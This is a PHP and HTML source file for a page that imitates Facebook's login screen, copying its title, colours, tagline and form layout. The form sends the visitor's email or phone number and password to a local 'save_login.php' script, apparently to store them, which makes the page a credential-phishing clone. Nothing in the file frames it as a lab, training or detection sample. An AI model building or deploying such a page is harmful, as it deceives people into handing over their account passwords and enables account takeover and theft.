<?php
session_start();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – Log In</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f0f2f5;
        }
        .container-custom {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-box {
            display: flex;
            gap: 50px;
            flex-wrap: wrap;
        }
        .left-text {
            max-width: 400px;
        }
        .left-text h1 {
            font-size: 50px;
            color: #1877f2;
            font-weight: bold;
        }
        .card-login {
            width: 350px;
            padding: 20px;
            border-radius: 8px;
        }
        .btn-login {
            background-color: #1877f2;
            color: white;
            font-weight: bold;
        }
        .btn-login:hover {
            background-color: #166fe5;
        }
        .btn-create {
            background-color: #42b72a;
            color: white;
            font-weight: bold;
        }
        .btn-create:hover {
            background-color: #36a420;
        }
        .forgot-link {
            font-size: 14px;
            display: block;
            text-align: center;
            margin-top: 10px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

<div class="container container-custom">
    <div class="login-box">

        <div class="left-text">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>

        <div class="card shadow card-login">
            <?php
            if(isset($_SESSION['msg'])){
                echo '<div class="alert alert-success">'.$_SESSION['msg'].'</div>';
                unset($_SESSION['msg']);
            }
            ?>
            <form action="save_login.php" method="POST">
                <div class="mb-3">
                    <input type="text" name="userid" class="form-control" placeholder="Email address or phone number" required>
                </div>
                <div class="mb-3">
                    <input type="password" name="password" class="form-control" placeholder="Password" required>
                </div>
                <button type="submit" class="btn btn-login w-100 mb-2">Log in</button>
                <a href="#" class="forgot-link text-primary">Forgotten password?</a>
                <hr>
                <button type="button" class="btn btn-create w-100">Create new account</button>
            </form>
        </div>

    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>